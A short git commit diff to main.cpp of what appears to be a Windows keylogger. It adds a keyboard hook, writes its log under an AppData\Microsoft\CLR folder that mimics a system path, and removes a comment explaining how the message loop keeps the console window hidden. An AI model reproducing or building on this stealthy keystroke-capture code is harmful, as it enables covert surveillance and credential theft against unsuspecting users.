2c4995a15e7eeb93180be2b2423ada8574e9b4f7
Neidi Chavez <31120419+nchacha@users.noreply.github.com>
2018-02-01 11:33:45 -0800

    Update main.cpp

--- main.cpp
+++ main.cpp
@@ -14,16 +14,9 @@ using namespace std;
 int main()
 {
     MSG Msg;
-    //creates the file at: C:\Users\Owner\AppData\Roaming\Microsoft\CLR
+    //creates the log file at: C:\Users\[USERNAME]\AppData\Roaming\Microsoft\CLR
     IO::MKDir(IO::GetOurPath(true));
     InstallHook();
-    /*
-    this will prevent the console window from appearing
-    by catching the "message" before reaching the console window
-    GetMessage - retrieves the "message" or keystroke from the queue
-    TranslateMessage - translates virtual keystrokes into strings
-    DispatchMessage - sends the message to the next step
-    */
 
     while(GetMessage(&Msg, NULL,0,0))
     {
